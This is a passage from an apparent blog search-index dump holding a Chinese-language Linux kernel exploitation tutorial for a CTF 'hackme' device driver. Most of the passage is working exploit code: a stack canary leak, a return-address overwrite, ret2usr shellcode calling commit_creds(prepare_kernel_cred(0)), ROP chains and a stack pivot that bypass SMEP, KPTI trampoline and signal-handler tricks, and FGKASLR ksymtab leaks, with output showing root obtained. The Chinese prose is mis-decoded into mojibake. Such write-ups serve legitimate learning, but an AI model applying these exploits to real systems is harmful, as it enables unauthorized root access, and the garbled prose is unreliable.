Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#first-stepret2usr"},{"categories":["Pwning"],"content":"Open the deviceåœ¨äº¤äº’ä¹‹å‰æˆ‘ä»¬éœ€è¦æ‰“å¼€è®¾å¤‡ã€‚ int global_fd; // ä¸ºäº†è®©å…¶ä»–å‡½æ•°èƒ½ä¸è®¾å¤‡äº¤äº’ void open_dev() { global_fd = open(\"/dev/hackme\", O_RDWR); if (global_fd \u003c 0) { puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#open-the-device"},{"categories":["Pwning"],"content":"Leak canaryå› ä¸ºè¿˜æœ‰æ ˆä¿æŠ¤ï¼Œæ‰€ä»¥è¿˜è¦å…ˆleak canaryä¿¡æ¯ã€‚ unsigned long canary; void leak(void){ unsigned n = 20; unsigned long leak[n]; ssize_t r = read(global_fd, leak, sizeof(leak)); canary = leak[16]; printf(\"[*] Leaked %zd bytes\\n\", r); printf(\"[*] Cookie: %lx\\n\", canary); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-canary"},{"categories":["Pwning"],"content":"Overwrite return addrä¸‹é¢æˆ‘ä»¬å°±è¦è¦†ç›–è¿”å›åœ°å€äº† void overflow(void){ unsigned n = 50; unsigned long payload[n]; unsigned off = 16; payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = (unsigned long)pwned_addr; // ret puts(\"[*] Prepared payload\"); ssize_t w = write(global_fd, payload, sizeof(payload)); puts(\"[!] Should never be reached\"); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#overwrite-return-addr"},{"categories":["Pwning"],"content":"User shellcodeåœ¨ç”¨æˆ·æ€ä¸‹æˆ‘ä»¬çš„ç›®çš„å¾€å¾€æ˜¯æ‰§è¡Œsystem(\"/bin/sh\")ç­‰ï¼Œç”¨æ¥è·å–ä¸€ä¸ªshellã€‚åœ¨å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å·²ç»get shelläº†ï¼Œä½†æ˜¯æƒé™å´åªæ˜¯æ™®é€šç”¨æˆ·ã€‚æˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ªroot shellï¼Œæ¥å®Œå…¨æ§åˆ¶è¿™ä¸ªç³»ç»Ÿã€‚ Linuxç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰å…¶å¯¹åº”çš„struct credï¼Œç”¨äºè®°å½•è¯¥è¿›ç¨‹çš„uidã€‚å†…æ ¸exploitçš„ç›®çš„ï¼Œä¾¿æ˜¯ä¿®æ”¹å½“å‰è¿›ç¨‹çš„credï¼Œä»è€Œæå‡æƒé™ã€‚å½“ç„¶ï¼Œè¿›ç¨‹æœ¬èº«æ˜¯æ— æ³•ç¯¡æ”¹è‡ªå·±çš„credçš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å†…æ ¸ç©ºé—´ä¸­ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼æ¥è¾¾åˆ°è¿™ä¸€ç›®çš„ï¼š commit_creds(prepare_kernel_cred(0)); å…¶ä¸­ï¼Œprepare_kernel_cred()åˆ›å»ºä¸€ä¸ªæ–°çš„credï¼Œå‚æ•°ä¸º0åˆ™å°†credä¸­çš„uid, gidè®¾ç½®ä¸º0ï¼Œå¯¹åº”äºrootç”¨æˆ·ã€‚éšåï¼Œcommit_creds()å°†è¿™ä¸ªcredåº”ç”¨äºå½“å‰è¿›ç¨‹ã€‚æ­¤æ—¶ï¼Œè¿›ç¨‹ä¾¿æå‡åˆ°äº†rootæƒé™ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾è¿™ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ã€‚å› ä¸ºKASLRè¢«ç¦ç”¨äº†ï¼Œæˆ‘ä»¬ä»¥rootæƒé™å¯åŠ¨çš„å†…æ ¸ï¼Œå¯ä»¥é€šè¿‡æ‰“å¼€/proc/kallsymsï¼Œæ¥æ‰¾åˆ°æ‰€æœ‰å†…æ ¸å‡½æ•°çš„åœ°å€ã€‚ / # cat /proc/kallsyms |grep commit_creds ffffffff814c6410 T commit_creds ffffffff81f87d90 r __ksymtab_commit_creds ffffffff81fa0972 r __kstrtab_commit_creds ffffffff81fa4d42 r __kstrtabns_commit_creds / # cat /proc/kallsyms | grep prepare_kernel_cred ffffffff814c67f0 T prepare_kernel_cred ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™è‡ªå·±çš„shellcodeäº†ã€‚ void pwned_addr(void){ __asm__( \".intel_syntax noprefix;\" \"movabs rax, 0xffffffff814c67f0;\" //prepare_kernel_cred \"xor rdi, rdi;\" \"call rax; mov rdi, rax;\" \"movabs rax, 0xffffffff814c6410;\" //commit_creds \"call rax;\" ... \".att_syntax;\" ); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:4","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#user-shellcode"},{"categories":["Pwning"],"content":"Return to userlandç°åœ¨æˆ‘ä»¬å†™çš„expï¼Œæ˜¯æ²¡æœ‰åŠæ³•è·å¾—rootæƒé™çš„ã€‚åŸå› æ˜¯ï¼Œå†…æ ¸æ€å’Œç”¨æˆ·æ€æ˜¯éš”ç¦»çš„ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œshellcodeæ—¶ï¼Œæˆ‘ä»¬è¿˜åœ¨å†…æ ¸æ€ï¼Œå®ƒä¸ä¼šæŠŠç»“æœç»™ç”¨æˆ·ï¼Œå®ƒæ²¡æœ‰è¿”å›ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦å…¶è¿”å›ç”¨æˆ·æ€ã€‚ è¿™é‡Œè¦å†è®²ä¸€ä¸‹ï¼Œç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´çš„åˆ‡æ¢ã€‚å½“ç”¨æˆ·æ€ä¸»åŠ¨è¿›å…¥å†…æ ¸æ—¶ï¼ˆç³»ç»Ÿè°ƒç”¨ã€å¼‚å¸¸ï¼‰ï¼Œå°±ä¼šé™·å…¥å†…æ ¸æ€ï¼Œæ­¤æ—¶æœ‰ç‰¹æƒçº§çš„æå‡ï¼Œæ¶‰åŠåˆ°å †æ ˆçš„åˆ‡æ¢ã€‚é¦–å…ˆï¼Œè¦ä¿å­˜user_ss(segment selector)ã€user_spã€user_flagsã€user_csã€user_ipä»¥åŠerrç­‰ä¿¡æ¯ã€‚åœ¨è¿”å›çš„æ—¶å€™è¦æ¢å¤è¿™äº›å¯„å­˜å™¨çš„å€¼ã€‚ å¯¹äºæˆ‘ä»¬çš„shellcodeï¼Œåœ¨å¼€å§‹ä¹‹å‰ä¹Ÿè¦å…ˆä¿å­˜è¿™äº›ä¿¡æ¯ï¼Œä»¥ä¾¿åœ¨è¿”å›çš„æ—¶å€™è®©ç³»ç»Ÿèµ°æ­£å¸¸çš„æµç¨‹ã€‚ unsigned long user_cs,user_ss,user_sp,user_rflags,user_rip; void save_state(){ __asm__( \".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" \".att_syntax;\" ); puts(\"[*] Saved state\"); } æ²¡æœ‰ç›´æ¥æ“ä½œæ ‡å¿—å¯„å­˜å™¨çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä½¿ç”¨äº†pushfã€‚å¦å¤–ï¼Œæˆ‘ä»¬è¿”å›æ—¶éœ€è¦æ¢å¤è¿™äº›å€¼ï¼ŒåŒæ—¶è¿˜è¦æ¢å¤gsçš„å€¼ã€‚gså¯„å­˜å’Œfså¯„å­˜å™¨éƒ½æ˜¯é™„ä»¶æ®µçš„æ®µå¯„å­˜å™¨ï¼Œè¿™äº›å¯„å­˜å™¨çš„å…·ä½“ä½œç”¨ç”±ç³»ç»Ÿæ¥å†³å®šï¼Œåœ¨Linuxä¸­ï¼ŒgsæŒ‡å‘TLSç»“æ„ï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è·å–å†…æ ¸å †æ ˆåœ°å€ç­‰é‡è¦ä¿¡æ¯ã€‚åœ¨è¿”å›æ—¶ï¼Œæˆ‘ä»¬è¦é€šè¿‡swapgså°†å…¶åˆ‡æ¢å›ç”¨æˆ·æ€çš„gsã€‚è¿”å›è¦ä½¿ç”¨iretï¼š iretæŒ‡ä»¤ä¼šæŒ‰é¡ºåºä¾æ¬¡å¼¹å‡ºeipã€csä»¥åŠeflagçš„å€¼åˆ°ç‰¹å®šå¯„å­˜å™¨ä¸­ï¼Œç„¶åä»æ–°çš„cs:ipå¤„å¼€å§‹æ‰§è¡Œã€‚å¦‚æœç‰¹æƒçº§å‘ç”Ÿæ”¹å˜ï¼Œåˆ™è¿˜ä¼šåœ¨å¼¹å‡ºeflagåå†ä¾æ¬¡å¼¹å‡ºspä¸sså¯„å­˜å™¨å€¼ã€‚ ä¿®æ”¹shellcode: unsigned long user_rip = (unsigned long)get_shell; void pwned_addr(void){ __asm__( \".intel_syntax noprefix;\" \"movabs rax, 0xffffffff814c67f0;\" //prepare_kernel_cred \"xor rdi, rdi;\" \"call rax; mov rdi, rax;\" \"movabs rax, 0xffffffff814c6410;\" //commit_creds \"call rax;\" \"swapgs;\" \"mov r15, user_ss;\" \"push r15;\" \"mov r15, user_sp;\" \"push r15;\" \"mov r15, user_rflags;\" \"push r15;\" \"mov r15, user_cs;\" \"push r15;\" \"mov r15, user_rip;\" \"push r15;\" \"iretq;\" \".att_syntax;\" ); } æœ€åï¼Œæˆ‘ä»¬çš„è„šæœ¬ int main() { save_state(); open_dev(); leak(); overflow(); puts(\"[!] Should never be reached\"); return 0; } result: / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 160 bytes [*] Cookie: 6b6c612b1bbb5500 [*] Prepared payload [*] Returned to userland [*] UID: 0, got root! / # id uid=0 gid=0 / # cat /dev/s sda sg0 sg1 snapshot sr0 / # cat /dev/sda hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:5","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#return-to-userland"},{"categories":["Pwning"],"content":"Add SMEP\u0026Kernel-ROPä¸‹é¢å¢åŠ éš¾åº¦ï¼Œå¼€å¯SMEPç¼“è§£æœºåˆ¶ã€‚åœ¨è¿™ä¹‹åï¼Œæ‰€æœ‰çš„ç”¨æˆ·ç©ºé—´é¡µåœ¨å†…æ ¸æ€éƒ½æ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿™ä½¿å¾—æˆ‘ä»¬çš„shellcodeæ— æ³•åœ¨å†…æ ¸æ€æ‰§è¡Œï¼Œret2usrå¤±æ•ˆäº†ã€‚æˆ‘ä»¬çš„ç›®çš„ä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œåœ¨å†…æ ¸æ€æ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ€è·¯ï¼š SMEPç”±CR4å¯„å­˜å™¨æ§åˆ¶ï¼Œæˆ‘ä»¬æ”¹å†™CR4çš„ç¬¬20æ¯”ç‰¹ï¼Œä½¿SMEPå¤±æ•ˆï¼› åœ¨å†…æ ¸ä¸­å¯»æ‰¾gadgetæ„é€ ROPé“¾ï¼Œå¹¶è¿”å›ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-smepkernel-rop"},{"categories":["Pwning"],"content":"Trying to overwrite CR4ç†è®ºä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨native_write_cr4()æ”¹å˜CR4çš„å€¼ï¼Œè¿™ä¸ªæ–¹æ³•å¾ˆç®€å•ç›´æ¥ã€‚ä½†æ˜¯ï¼Œäººä»¬ä¹Ÿæ³¨æ„åˆ°äº†è¿™è®©å†…æ ¸é™·å…¥æ— æ¯”å±é™©çš„å¢ƒåœ°ã€‚æ‰€ä»¥ï¼Œå†…æ ¸åœ¨å¯åŠ¨æ—¶ä¼šå°†CR4å›ºå®šï¼Œå¦‚æœè¯•å›¾æ”¹å˜å°±ä¼šè§¦å‘é”™è¯¯ã€‚a documentation on CR4 bits pinning è¿™ç§æ–¹æ³•ä¸å¯è¡Œã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#trying-to-overwrite-cr4"},{"categories":["Pwning"],"content":"æ„é€ ROP chainæˆ‘ä»¬éœ€è¦ä»¥ä¸‹åŠŸèƒ½ï¼š prepare_kernel_cred(0) commit_creds() swapgs;ret æ¢å¤å¯„å­˜å™¨ï¼Œiretq å¯»æ‰¾gadget /* 0xffffffff81006370 : pop rdi ; ret 0xffffffff8150b97e : pop rsi ; ret 0xffffffff81007616 : pop rdx ; ret 0xffffffff815f4bbc : pop rcx ; ret 0xffffffff81004d11 : pop rax ; ret 0xffffffff81006158 : pop rbx ; ret 0xffffffff8144591b : pop r13 ; ret 0xffffffff8100636d : pop r12 ; pop r15 ; ret 0xffffffff8100636f : pop r15 ; ret 0xffffffff8100a55f : swapgs ; pop rbp ; ret 0xffffffff8100c0d9: 48 cf iretq 0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret 0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret 0xffffffff816bfe27 : cmp rdi, rsi ; jne 0xffffffff816bfdfa ; pop rbp ; ret */ unsigned long pop_rdi_ret = 0xffffffff81006370; unsigned long pop_rsi_ret = 0xffffffff8150b97e; unsigned long commit_creds = 0xffffffff814c6410; unsigned long prepare_kernel_cred = 0xffffffff814c67f0; unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; unsigned long iretq = 0xffffffff8100c0d9; unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; unsigned long cmp_rdi_rsi_jne_pop_ret = 0xffffffff816bfe27; $ objdump -j .text -d ./vmlinux | grep iretq | head -1 ffffffff8100c0d9: 48 cf iretq æœ‰æ—¶ROPgadgetæ‰¾åˆ°çš„gadgetå¹¶ä¸åœ¨å¯æ‰§è¡ŒåŒºï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾å…¶ä»–çš„gadgetã€‚ payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi_ret; // return address payload[off++] = 0x0; // rdi \u003c- 0 payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) payload[off++] = pop_rdi_ret; payload[off++] = 0x1; // rdi \u003c- 1 payload[off++] = pop_rsi_ret; payload[off++] = 0x1; // rsi \u003c- 1 payload[off++] = cmp_rdi_rsi_jne_pop_ret; payload[off++] = 0x0; // dummy rbp payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi \u003c- rax payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) payload[off++] = swapgs_pop_ret; // swapgs payload[off++] = 0x0; // dummy rbp payload[off++] = iretq; // iretq frame payload[off++] = user_rip; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#æ„é€ rop-chain"},{"categories":["Pwning"],"content":"Stack pivotæˆ‘ä»¬å†åŠ å¤§ä¸€äº›éš¾åº¦å‡è®¾å¦ä¸€ç§æƒ…å†µï¼šæº¢å‡ºçš„é•¿åº¦ä¸è¶³ä»¥å†™å…¥å®Œæ•´çš„ROPé“¾ã€‚æ­¤æ—¶ï¼Œå°±è¦è¿›è¡Œæ ˆè¿ç§»ã€‚ æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·çš„gadget 0xffffffff810062dc : mov rsp, rbp ; pop rbp ; ret rbpåœ¨æˆ‘ä»¬è¿”å›çš„æ—¶å€™å°±å·²ç»å¯ä»¥æ§åˆ¶äº†ï¼Œæ‰€ä»¥åªè¦ç”³è¯·ä¸€å—å†…å­˜å¹¶æ§åˆ¶å…¶å†…å®¹å°±å¯ä»¥äº†ã€‚ void build_fake_stack(void){ fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0); unsigned off = 0x1000 / 8; fake_stack[0] = 0xdead; // put something in the first page to prevent fault fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = pop_rdi_ret; // return address fake_stack[off++] = 0x0; // rdi \u003c- 0 fake_stack[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) fake_stack[off++] = pop_rdi_ret; fake_stack[off++] = 0x1; // rdi \u003c- 1 fake_stack[off++] = pop_rsi_ret; fake_stack[off++] = 0x1; // rsi \u003c- 1 fake_stack[off++] = cmp_rdi_rsi_jne_pop_ret; fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = mov_rdi_rax_jne_pop2_ret; // rdi \u003c- rax fake_stack[off++] = 0x0; // dummy rbx fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) fake_stack[off++] = swapgs_pop_ret; // swapgs fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = iretq; // iretq frame fake_stack[off++] = user_rip; fake_stack[off++] = user_cs; fake_stack[off++] = user_rflags; fake_stack[off++] = user_sp; fake_stack[off++] = user_ss; } è¿™é‡Œ0x5b000000 - 0x1000æ˜¯ä¸ºäº†è®©æ ˆæœ‰å¢é•¿çš„ç©ºé—´ï¼Œä»¥é¡ºåˆ©çš„æ‰§è¡Œå…¶ä»–å‡½æ•°ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#stack-pivot"},{"categories":["Pwning"],"content":"Add KPTIæœ‰äº†KPTIç”¨æˆ·ç©ºé—´é¡µè¡¨ä¸å†…æ ¸ç©ºé—´é¡µè¡¨éš”ç¦»å¼€ã€‚æˆ‘ä»¬ä»å†…æ ¸æ€ç›´æ¥ä½¿ç”¨iretqè¿”å›ï¼Œæ²¡æœ‰åˆ‡æ¢é¡µè¡¨ã€‚æ‰€ä»¥å½“ç”¨æˆ·æ€çš„ç¨‹åºæƒ³è¦æ‰§è¡Œæ—¶ä¼šé€ æˆæ®µé”™è¯¯ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•è¿›è¡Œbypassï¼š æ‰§è¡Œæ­£å¸¸è¿”å›åº”è¯¥æ‰§è¡Œçš„å‡½æ•°ã€‚ ä½¿ç”¨ä¿¡å·å¤„ç†ï¼šåœ¨Linuxä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°ã€‚åœ¨Segmentation faultæ—¶ï¼Œå†…æ ¸ä¼šå‘è¿›ç¨‹å‘é€ä¸€ä¸ªSIGSEGVä¿¡å·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™ä¸ªä¿¡å·ä½¿ç¨‹åºè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œå¼‚å¸¸å¤„ç†çš„ç¨‹åºåœ¨å†…æ ¸ä»£ç ä¸­ï¼Œæœ€ç»ˆç»“æœæ˜¯æ€æ­»è¿™ä¸ªè¿›ç¨‹ã€‚å¦‚æœæˆ‘ä»¬æ³¨å†Œäº†å¤„ç†æœåŠ¡ï¼Œå†…æ ¸åœ¨å¤„ç†æ—¶å°±ä¼šå›åˆ°ç”¨æˆ·æ€ï¼è¿™æ­£è¾¾æˆäº†æˆ‘ä»¬çš„ç›®çš„ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-kpti"},{"categories":["Pwning"],"content":"Normal ROPæ­£å¸¸è¿”å›æ—¶ä¼šè°ƒç”¨çš„å‡½æ•°ä¸ºswapgs_restore_regs_and_return_to_usermodeã€‚æˆ‘ä»¬é€šè¿‡/proc/kallsymså¾—åˆ°å®ƒçš„åœ°å€ã€‚ / # cat /proc/kallsyms |grep swapgs_restore_regs_and_return_to_usermode ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode è¿™ä¸ªå‡½æ•°åœ¨idaä¸­æ˜¯è¿™æ ·çš„ï¼š .text:FFFFFFFF81200F10 pop r15 .text:FFFFFFFF81200F12 pop r14 .text:FFFFFFFF81200F14 pop r13 .text:FFFFFFFF81200F16 pop r12 .text:FFFFFFFF81200F18 pop rbp .text:FFFFFFFF81200F19 pop rbx .text:FFFFFFFF81200F1A pop r11 .text:FFFFFFFF81200F1C pop r10 .text:FFFFFFFF81200F1E pop r9 .text:FFFFFFFF81200F20 pop r8 .text:FFFFFFFF81200F22 pop rax .text:FFFFFFFF81200F23 pop rcx .text:FFFFFFFF81200F24 pop rdx .text:FFFFFFFF81200F25 pop rsi .text:FFFFFFFF81200F26 mov rdi, rsp .text:FFFFFFFF81200F29 mov rsp, qword ptr gs:unk_6004 .text:FFFFFFFF81200F32 push qword ptr [rdi+30h] .text:FFFFFFFF81200F35 push qword ptr [rdi+28h] .text:FFFFFFFF81200F38 push qword ptr [rdi+20h] .text:FFFFFFFF81200F3B push qword ptr [rdi+18h] .text:FFFFFFFF81200F3E push qword ptr [rdi+10h] .text:FFFFFFFF81200F41 push qword ptr [rdi] .text:FFFFFFFF81200F43 push rax .text:FFFFFFFF81200F44 jmp short loc_FFFFFFFF81200F89 ... å‰é¢å¤šå‡ºäº†å¾ˆå¤špop xxxè¿™æ— ç–‘ä¼šåŠ é•¿æˆ‘ä»¬çš„ROPé“¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»swapgs_restore_regs_and_return_to_usermode+22å¼€å§‹ã€‚ è¿˜æœ‰ä¸€äº›å€¼å¾—å…³æ³¨çš„åœ°æ–¹ã€‚ .text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89: .text:FFFFFFFF81200F89 pop rax .text:FFFFFFFF81200F8A pop rdi .text:FFFFFFFF81200F8B call cs:off_FFFFFFFF82040088 .text:FFFFFFFF81200F91 jmp cs:off_FFFFFFFF82040080 ... .text.native_swapgs:FFFFFFFF8146D4E0 push rbp .text.native_swapgs:FFFFFFFF8146D4E1 mov rbp, rsp .text.native_swapgs:FFFFFFFF8146D4E4 swapgs .text.native_swapgs:FFFFFFFF8146D4E7 pop rbp .text.native_swapgs:FFFFFFFF8146D4E8 retn ... .text:FFFFFFFF8120102E mov rdi, cr3 .text:FFFFFFFF81201031 jmp short loc_FFFFFFFF81201067 ... .text:FFFFFFFF81201067 or rdi, 1000h .text:FFFFFFFF8120106E mov cr3, rdi ... .text:FFFFFFFF81200FC7 iretq åœ¨jmp short loc_FFFFFFFF81200F89åï¼Œæœ‰ä¸¤ä¸ªå¤šçš„popæ‰€ä»¥æˆ‘ä»¬è¦ä½“ç°å¸ƒç½®å¥½å¡«å……ã€‚ payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = user_rip; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#normal-rop"},{"categories":["Pwning"],"content":"Signal handlerä¿æŒåŸæ¥çš„payloadä¸å˜ï¼Œåœ¨mainä¸­è¿›è¡Œå¤„ç†å‡½æ•°æ³¨å†Œsignal(SIGSEGV, get_shell); ç»å¦™çš„ä¸»æ„ï¼ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#signal-handler"},{"categories":["Pwning"],"content":"Add SMAPæ·»åŠ SMAPåç”¨æˆ·æ€çš„é¡µé¢æ— æ³•è¢«è®¿é—®ï¼Œè¿™å¹¶æ²¡æœ‰å½±å“æˆ‘ä»¬çš„ROPã€‚ä½†æ˜¯æ ˆè¿ç§»æ— æ³•è¢«ä½¿ç”¨ï¼Œæˆ‘ä»¬æ— æ³•å°†æ ˆåŠ«æŒåˆ°ç”¨æˆ·ç©ºé—´ã€‚ ç›®å‰ç»•è¿‡çš„æŠ€æœ¯ä»ç„¶æœªçŸ¥ã€‚TODO ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:7:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-smap"},{"categories":["Pwning"],"content":"Add KASLRç°åœ¨ï¼Œæˆ‘ä»¬é¢å¯¹å®Œæ•´çš„æŒ‘æˆ˜äº†ï¼ å¦‚æœä»…ä»…ä½¿ç”¨KASLRæˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šæ³„éœ²å†…æ ¸çš„åŸºå€å¹¶é€šè¿‡åç§»æ‰¾åˆ°å…¶ä»–æ‰€æœ‰å‡½æ•°ã€‚è¿™æ²¡æœ‰å¢åŠ å¤ªå¤§çš„å›°éš¾ã€‚åœ¨FGKASLRä¸‹ï¼Œå³ä½¿æˆ‘ä»¬çŸ¥é“äº†å†…æ ¸çš„åŸºå€ï¼Œå…¶ä»–å‡½æ•°çš„åç§»ä¾ç„¶æ— æ³•ç¡®å®šã€‚ è¿è¡Œå¤šæ¬¡å¹¶æŸ¥çœ‹/proc/kallsymsï¼Œå‘ç°æ¯æ¬¡åç§»éƒ½ä¸åŒï¼Œåˆ™å¼€å¯çš„FGASLR åœ¨FGKASLRä¸‹æœ‰ä¸€äº›åç§»æ˜¯ä¸å˜çš„ï¼š ä»_textåˆ°__x86_retpoline_r15ï¼Œå³_text+0x400dc6 swwapgs_restore_regs_and_return_to_usermodeæ²¡æœ‰å˜åŒ– ksymtabåœ°å€ï¼Œè¯¥ç»“æ„è®°å½•å…¶ä»–æ‰€æœ‰å‡½æ•°çš„åœ°å€ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä»ä¸­å¾—åˆ°prepare_kernel_credå’Œcommit_credsã€‚ struct kernel_symbol { int value_offset; // funcxx_addr = ksymtab_funcxx_addr + value_offset int name_offset; int namespace_offset; }; å¯»æ‰¾èƒ½ä½¿ç”¨çš„gadgetã€‚ /* ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred ffffffff81f87d90 r __ksymtab_commit_creds 0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret 0xffffffff81004d11 : pop rax ; ret 0xffffffff81006370 : pop rdi ; ret 0xffffffff81007616 : pop rdx ; ret 0xffffffff81006158 : pop rbx ; ret 0xffffffff8100636d : pop r12 ; pop r15 ; ret 0xffffffff8100636f : pop r15 ; ret 0xffffffff8100636e : pop rsp ; pop r15 ; ret */ void leak(void) { unsigned n = 40; unsigned long leak[n]; ssize_t r = read(global_fd, leak, sizeof(leak)); canary = leak[16]; kernel_base = leak[38] - 0xa157ULL; kpti_pass = kernel_base + 0x200f10ULL + 22ULL; pop_rax = kernel_base + 0x4d11ULL; pop_rdi = kernel_base + 0x6370ULL; pop_rdx = kernel_base + 0x7616ULL; pop_rbx = kernel_base + 0x6158ULL; ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL; ksymtab_commit_creds = kernel_base + 0xf87d90ULL; read_mrax_pop = kernel_base + 0x15a7fULL; printf(\"[*] Leaked %zd bytes\\n\", r); printf(\"[*] Cookie: %lx\\n\", canary); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-kaslr"},{"categories":["Pwning"],"content":"Leak prepare_kernel_cred() \u0026 commit_creds()é€šè¿‡mov rax, qword ptr 